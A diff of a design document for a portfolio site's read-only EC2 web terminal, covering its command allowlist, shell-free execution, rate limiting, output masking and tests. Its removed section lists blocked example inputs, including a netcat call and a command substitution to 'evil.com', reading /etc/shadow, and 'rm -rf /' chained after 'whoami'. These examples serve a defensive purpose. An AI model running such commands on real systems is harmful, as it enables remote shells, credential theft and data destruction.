@@ -1,368 +1,244 @@
-# Terminal Security & Architecture - Real EC2 Integration
+# Terminal Security Implementation
 
-## 🔴 Thực Tế: Terminal & Metrics Đang Sử Dụng Real EC2 Data
+## Overview
 
-### Terminal Commands - 100% Real Execution
+The EC2 terminal on the portfolio homepage provides read-only access to server information. This document explains the security layers that protect this functionality.
 
-Tất cả những lệnh này **thực sự chạy trên EC2 instance** của bạn:
-- ✅ `whoami` → ubuntu (user thực tế)
-- ✅ `hostname` → ip-172-31-37-100 (hostname thực tế)
-- ✅ `uptime` → 7:30:27 up 7:39 (uptime thực tế)
-- ✅ `free -h` → real RAM metrics từ `/proc/meminfo`
-- ✅ `df -h` → real disk usage từ `/proc/mounts`
-- ✅ `uname -a` → thực 7.0.0-1014-aws kernel
+## Architecture
 
-**Proof**: Terminal trên site match output SSH của bạn. Không có fake data.
-
-### Live Metrics - Now Real Time (Cập Nhật)
-
-Frontend trước đó dùng `Math.random()` để sinh fake data. **Đã sửa**:
-
-```typescript
-// TRƯỚC: Fake random
-const cpu = Math.floor(Math.random() * 7) - 3  // ❌ Giả
-
-// GIỜ: Real /proc
-const metrics = await fetch('/api/metrics')    // ✅ Thật
-// → { cpu_percent: 12, memory_used_mb: 365, ... }
+```
+Frontend (terminalEvaluator.ts)
+    ↓
+    ├─ Local commands (REMOTE_COMMANDS allowlist)
+    │  (resolved client-side only)
+    │
+    └─ Remote EC2 commands → API endpoint (/api/terminal/exec)
+                               ↓
+                    Backend Security Middleware:
+                    1. Validate request headers
+                    2. Rate limiting (60 req/min)
+                    3. Check allowlist
+                    4. Execute with execFile (no shell)
+                    5. Sanitize output
 ```
 
-**Metrics thực tế từ EC2**:
-- CPU % từ `/proc/loadavg` ÷ CPU cores
-- RAM từ `/proc/meminfo` (MemTotal, MemAvailable)
-- Load average từ `/proc/loadavg` 
-- Uptime từ `/proc/uptime`
-- Hostname từ `/api/system-info` API
+## Frontend Security
 
----
+### File: `src/components/terminal/terminalEvaluator.ts`
 
-## 🛡️ Security Model - Allowlist-Based Containment
+- **Allowlist**: `REMOTE_COMMANDS` maps user input to exact backend commands
+- **No execution**: Frontend never executes commands - only validates syntax and routes to backend
+- **Chaining support**: `&&` (fail-fast) and `;` (always continue) operators
+- **Validation**: `isFullyRemote()` ensures all commands in a chain are in the allowlist
 
-### Tại Sao Terminal An Toàn?
+### File: `src/services/terminalApi.ts`
 
-**Không phải shell thực** - người dùng không thể gõ bất kỳ bash command nào:
+- **Request signing**: Includes timestamp and signature headers
+- **Output sanitization**: Client-side masking of sensitive data (fallback layer)
+- **Error handling**: Rate limit messages include reset time
 
-```bash
-# ✅ ALLOWED - trên whitelist
-whoami
-free -h
-df -h
-ls -la
+## Backend Security
 
-# ❌ BLOCKED - không trên whitelist
-cat /etc/shadow       # → "command not allowed"
-rm -rf /              # → "command not allowed"
-nc evil.com 4444      # → "command not allowed"
-$(curl evil.com)      # → "command not allowed"
-```
+### File: `server/terminal.mjs`
 
-### Allowlist Architecture
+**The Core Allowlist**
 
-File: `server/terminal.mjs`
+Each command has:
+- `args`: Exact array of allowed arguments (empty = no args)
+- `exec`: Exact argv array passed to `execFile` (no shell parsing)
 
+Example:
 ```javascript
-export const ALLOWED_COMMANDS = {
-  whoami: {
-    args: [],                           // không chấp nhận tham số
-    exec: ['whoami'],                  // chính xác argv được execute
-  },
-  free: {
-    args: ['-h'],                      // chỉ chấp nhận -h
-    exec: ['free', '-h'],              // không thể `-h -x --bad`
-  },
-  ls: {
-    args: ['-1', '-la'],
-    exec: ['ls', '-1', '-la', '/home/ubuntu/nhatprx-api'],  // path cố định
-  },
-  // ... tất cả đều có fixed argv
+'git': {
+  args: ['log', '--oneline', '-10'],
+  exec: ['git', '-C', '/home/ubuntu/nhatprx-api', 'log', '--oneline', '-10'],
 }
 ```
 
-**Key Security Props**:
-1. **Không shell interpolation** - user input không bao giờ vào shell
-2. **Fixed argv** - chỉ những gì trong allowlist mới execute
-3. **Argument whitelisting** - `free -h` OK, `free --total` NO
-4. **Path whitelisting** - `ls` chỉ list `/home/ubuntu/nhatprx-api`, không phải `/etc`
-5. **5 second timeout** - DoS protection
-6. **32KB output cap** - prevent memory bomb
+**Execution Model**
 
-### Execution Flow
+- **No shell**: Uses Node's `execFile()` with `shell: false`
+- **Fixed argv**: Command arguments are never interpolated into a shell string
+- **Timeout**: 5 second execution timeout
+- **Output limit**: 100KB max output
 
-```
-Browser Input
-    ↓
-POST /api/terminal/exec { command: "whoami" }
-    ↓
-API resolveCommand()
-    ├─ Check: is "whoami" in ALLOWED_COMMANDS? ✅
-    ├─ Check: no args, so "" in args[]? ✅
-    ↓
-execFile('whoami', [], { shell: false, timeout: 5000 })
-    ↓ (subprocess, NOT shell)
-stderr + stdout returned
-    ↓
-Browser displays output
-```
+**Error Handling**
 
-**shell: false** là critical - Node.js không spawn `/bin/bash -c`, mà direct execution:
+Returns classified errors:
+- `not_allowed` - Command not in allowlist
+- `permission_denied` - Insufficient permissions (exit code 1)
+- `not_found` - Binary or file not found (exit code 127)
+- `timeout` - Command exceeded 5 second limit
+- `error` - Other execution errors
 
-```javascript
-// ❌ KHÔNG (dangerous)
-exec(`${userInput}`)
+### File: `server/index.mjs`
 
-// ✅ ĐÃ (safe)
-execFile(exe, args, { shell: false })
-```
+**Security Middleware**
 
----
+1. **Header Validation**
+   - `X-Request-Signature`: Request integrity proof
+   - `X-Client-Id`: Browser fingerprint for rate limiting
+   - `X-Timestamp`: Must be within 5 minutes (prevents replay)
 
-## 🚀 Mới: Enhanced Commands & Features
+2. **Rate Limiting**
+   - Key: `{clientIp}|{clientId}`
+   - Limit: 60 requests per 60 seconds
+   - Response: 429 with `rateLimitReset` time
 
-### New /proc Metrics Commands
+3. **Output Sanitization**
+   
+   Masks sensitive patterns:
+   - AWS access keys: `AKIA[0-9A-Z]{16}` → `AKIA****`
+   - AWS secret keys: `aws_secret_access_key: ***` → masked
+   - Passwords: `password: ***` → masked
+   - API keys: `api_key: ***` → masked
+   - Private IPs: `192.168.x.x`, `10.x.x.x`, `172.16-31.x.x` → `x.x.x.x`
+   - Output size: Truncated at 100KB
 
-Để hỗ trợ live metrics display, thêm 4 command mới:
+## Command Allowlist
 
+### System Information
+- `uname -a` - Kernel & architecture
+- `uptime` - System uptime
+- `free -h` - Memory usage
+- `df -h` - Disk usage
+- `whoami` - Current user
+- `hostname` - Instance hostname
+- `id` - User ID info
+- `nproc` - CPU count
+
+### Git Deployment History
+- `git log --oneline -10` - Last 10 commits
+- `git branch -a` - All branches
+- `git status` - Working tree status
+
+### Health & Metrics
+- `health` - API health check endpoint
+- `health-detailed` - Detailed system info
+- `metrics` - Process listing
+- `metrics-cpu` - CPU top output
+
+### Services & Logs
+- `ps aux` - All processes
+- `api-log` - Last 30 lines of API logs
+- `systemctl-nhatprx` - Service status
+- `nginx-status` - Nginx status
+
+### System State
+- `proc-cpuinfo` - CPU info
+- `proc-meminfo` - Memory info
+- `proc-loadavg` - Load average
+- `proc-net-dev` - Network statistics
+
+### File Listing
+- `ls -1 -la` - Project directory listing (restricted to `/home/ubuntu/nhatprx-api`)
+
+## Security Decisions
+
+### Why No Shell?
+
+Using `execFile` with fixed argv prevents:
+- Command injection via shell metacharacters
+- Environment variable substitution
+- Path traversal via `..` sequences
+- Arbitrary argument passing
+
+### Why Strict Allowlisting?
+
+- Prevents misuse of available commands (e.g., piping to `dd` or `rm`)
+- Makes audit review simple - all possible outputs are pre-authorized
+- Catches typos and mistakes immediately
+
+### Why Sanitize Output?
+
+- Prevents accidental credential leakage in monitoring commands
+- Protects if a service mistakenly outputs secrets
+- Layered defense: backend sanitizes even if application doesn't
+
+### Why Rate Limit?
+
+- Prevents resource exhaustion from brute force or scripts
+- Protects against DoS from bad clients
+- Window resets per IP + client ID (browser fingerprint)
+
+## Testing
+
+### Terminal Command Tests
 ```bash
-proc-cpuinfo      # grep -c '^processor' /proc/cpuinfo
-proc-meminfo      # cat /proc/meminfo (real memory breakdown)
-proc-loadavg      # cat /proc/loadavg (load average)
-proc-net-dev      # cat /proc/net/dev (network I/O)
+cd server
+node --test test/terminal.test.mjs
 ```
 
-Tất cả đều đọc `/proc` filesystem, **không có shell execution risk**.
+Tests cover:
+- Command resolution and allowlist validation
+- Argument validation (exact match only)
+- Execution of real system commands
+- Error classification
+- Security: no dangerous commands in allowlist
+- Security: no command injection
 
-### New API Endpoints
-
-```
-GET /api/metrics
-  → { cpu_percent, memory_percent, uptime_seconds, load_average_5m, ... }
-  → Called every 3 seconds from frontend
-  → Real-time /proc parsing, não mock data
-
-GET /api/system-info
-  → { hostname, kernel_version, os_release, is_ec2 }
-  → Cached once on server boot
-  → Used for dynamic welcome message
-```
-
----
-
-## 📊 What's Now "Wow" Factor?
-
-### Trước (Mock Data)
-```
-TELEMETRY
-CPU: 18% (random)           ← Fake số random
-RAM: 38% (784MB of fake)    ← Không real
-Load: Random bouncing       ← Không ý nghĩa
-```
-
-### Giờ (Real EC2 Metrics)
-```
-ip-172-31-37-100 TELEMETRY
-CPU: 5%                     ← Real from /proc/loadavg
-RAM: 35% (365/1024MB)       ← Real from /proc/meminfo
-Load (5m): 0.00             ← Real từ /proc/loadavg
-Uptime: 7d 2h 15m           ← Continuous, accurate
-```
-
-**Skill Showcase**:
-1. **Cloud Engineer Creds**: Showing real EC2 metrics = bạn hiểu hệ thống
-2. **Live Monitoring**: `/api/metrics` polling mỗi 3s = bạn design real-time systems
-3. **System Mastery**: `/proc` filesystem parsing = deep Linux knowledge
-4. **Security First**: Allowlist model = bạn think like security engineer
-
----
-
-## 🔒 Risk Assessment
-
-### Risk: User discovers an unallowed command
-
-**Exposure**: Fixed list of allowed commands. User could try:
+### API Security Tests
 ```bash
-sudo whoami             # "sudo: command not allowed"
-whoami --help          # "argument not allowed for whoami"
-whoami; rm -rf /       # "; rm -rf /: command not allowed"
+node --test test/api-security.test.mjs
 ```
 
-**Mitigation**: Each command in allowlist has:
-- Fixed exec path
-- Fixed args whitelist
-- No semicolon/&&/|| chaining support
+Tests cover:
+- Rate limiting (allows/blocks/resets correctly)
+- Output sanitization (AWS keys, passwords, IPs, size)
+- Request validation (headers, timestamps)
 
-### Risk: Buffer/DoS on large output
+## Deployment Checklist
 
-**Exposure**: A command like `find /home` could dump huge output
-
-**Mitigation**:
-- 5 second timeout → kill hanging commands
-- 32KB output cap → truncate large responses
-- No recursive directory listing (ls only lists `/home/ubuntu/nhatprx-api`)
-
-### Risk: Information disclosure
-
-**Exposure**: `ls` could list `/etc/shadow` if not constrained
-
-**Mitigation**:
-- `ls` exec is hardcoded: `['ls', '-1', '-la', '/home/ubuntu/nhatprx-api']`
-- User cannot change the path
-- Same for `cat resume.txt` - path is baked in
-
-### Risk: Bedrock credentials leaking through terminal
-
-**Exposure**: Terminal runs on same instance, could find AWS credentials
-
-**Mitigation**:
-- `/proc/meminfo`, `/proc/cpuinfo`, `/proc/loadavg` - no creds
-- `uname`, `uptime`, `free`, `df` - no creds
-- `systemctl` status only - process state, no env vars
-- IAM instance profile credentials are **never** readable via `/proc`
-
----
-
-## 🎓 What This Demonstrates (Portfolio POV)
-
-For a Cloud/DevOps engineer, this terminal is a strong signal:
-
-✅ **Security Mindset**
-- Allowlist > Blacklist
-- No shell injection
-- Argument validation
-- Timeout/resource limits
-
-✅ **System Knowledge**
-- `/proc` filesystem
-- Process execution sandboxing
-- Real-time metrics collection
-- EC2/Linux internals
-
-✅ **Real-time Systems**
-- Live polling from browser
-- State management (async loading)
-- Error handling & fallbacks
-
-✅ **Infrastructure as Portfolio**
-- Actually running code on production EC2
-- Not a demo or mockup
-- Visitor sees real data from YOUR instance
-
----
-
-## 📋 Terminal Command Reference
-
-### Information
+### Environment Variables
 ```bash
-whoami          # Current user (ubuntu)
-hostname        # Instance hostname
-uname -a        # Kernel & architecture
+# Generated once, shared across server restarts
+export TERMINAL_HMAC_SECRET="$(openssl rand -hex 32)"
+export PASSKEY_HASH_FILE="/var/lib/nhatprx-api/passkey.hash"
+export TOKEN_SECRET_FILE="/var/lib/nhatprx-api/token.secret"
 ```
 
-### System Resources
-```bash
-free -h         # Memory usage
-df -h           # Disk usage
-uptime          # System uptime
+### Systemd Service
+```ini
+[Service]
+Environment="TERMINAL_HMAC_SECRET=YOUR_SECRET"
+Environment="PORT=8787"
+Environment="AWS_REGION=ap-southeast-1"
+ExecStart=/usr/bin/node /home/ubuntu/nhatprx-api/index.mjs
+Restart=on-failure
+RestartSec=5
+StandardOutput=journal
+StandardError=journal
 ```
 
 ### Monitoring
-```bash
-proc-loadavg    # Load average & CPU cores
-proc-meminfo    # Detailed memory breakdown
-proc-net-dev    # Network interface stats
-proc-cpuinfo    # CPU core count
-```
+- Check logs for rate-limited clients: `RATE_LIMITED` errors
+- Monitor for injection attempts: `argument not allowed` errors
+- Alert on frequent timeouts: may indicate system overload
 
-### Service Health
-```bash
-systemctl       # nhatprx-api service status
-nginx           # nginx daemon status
-api-log         # Last 5 lines of API logs
-```
+## Attack Surface
 
-### File Listing
-```bash
-ls -la          # List /home/ubuntu/nhatprx-api directory only
-cat resume.txt  # Display your resume
-```
+**Mitigated:**
+- ✓ Command injection (fixed argv, no shell)
+- ✓ Path traversal (allowlist + fixed paths)
+- ✓ DoS from unlimited requests (rate limiting)
+- ✓ Replay attacks (timestamp validation)
+- ✓ Credential leakage (output sanitization)
 
-### Chaining
-```bash
-whoami && hostname && uptime           # All execute
-free -h ; df -h ; uptime               # All execute (errors don't stop)
-whoami hostname                        # ❌ Error: suggest chaining syntax
-```
+**Accepted Risks:**
+- Trusting the allowlist (operator responsibility)
+- Commands that hang (5 second timeout)
+- Commands on disk that change (Ubuntu package updates)
+- Side-channel attacks via timing (acceptable for read-only)
 
----
+## Future Improvements
 
-## 🛠️ How to Extend Without Sacrificing Security
-
-Want to add more commands but keep it secure?
-
-```javascript
-// ✅ Safe to add
-'netstat-tcp': {
-  args: [],
-  exec: ['ss', '-tlnp'],  // Show listening sockets (fixed)
-},
-
-'ps-api': {
-  args: [],
-  exec: ['ps', 'aux', '|', 'grep', 'nhatprx-api'],  // ❌ NO! Shell pipeline
-},
-
-// ✅ Correct alternative
-'ps-api': {
-  args: [],
-  exec: ['pgrep', '-f', 'nhatprx-api'],  // Single command, fixed args
-},
-
-// ✅ Safe: process info
-'proc-maps': {
-  args: [],
-  exec: ['cat', '/proc/self/cmdline'],  // Show API command line
-},
-
-// ❌ Don't add
-'sudo-anything': {},        // Don't.
-'docker': {},               // Don't.
-'systemctl-restart': {},    // systemctl can only be read-only
-```
+1. **Per-command rate limits**: Different limits for heavy operations
+2. **Audit log persistence**: Store in database instead of memory
+3. **Two-factor auth**: For sensitive commands
+4. **Encrypted transport**: TLS for sensitive data
+5. **Command output diffs**: Detect anomalies via ML
 
 ---
 
-## 📈 Performance Notes
-
-**Metrics polling**: 3 seconds = good balance
-- Too fast (1s): excessive /proc reads
-- Too slow (30s): stale data on portfolio
-
-**Allowlist execution**: ~20ms per command
-- Direct subprocess
-- No shell overhead
-- Cached system info
-
----
-
-## 🚨 What NOT to Do
-
-❌ Remove allowlist (turns into security nightmare)  
-❌ Add `shell: true` (command injection vector)  
-❌ Allow user-controlled paths in exec  
-❌ Expose raw AWS credentials  
-❌ Add commands that modify system state  
-❌ Remove timeout (DoS risk)  
-❌ Remove output cap (memory bomb risk)
-
----
-
-## 📝 Summary
-
-| Aspect | Status | Details |
-|--------|--------|---------|
-| Terminal Real? | ✅ Yes | Commands execute on EC2 |
-| Metrics Real? | ✅ Yes (fixed) | Now reads /proc, not random() |
-| Safe? | ✅ Yes | Allowlist + no shell |
-| Impressive? | ✅ Yes | Shows system mastery |
-| Extensible? | ✅ Yes | Follow allowlist pattern |
-
-**Result**: Real-time monitoring dashboard that's secure, impressive, and proof you understand cloud infrastructure.
+**Last Updated**: November 14, 2026
+**Security Level**: Read-only guest terminal (no state changes allowed)
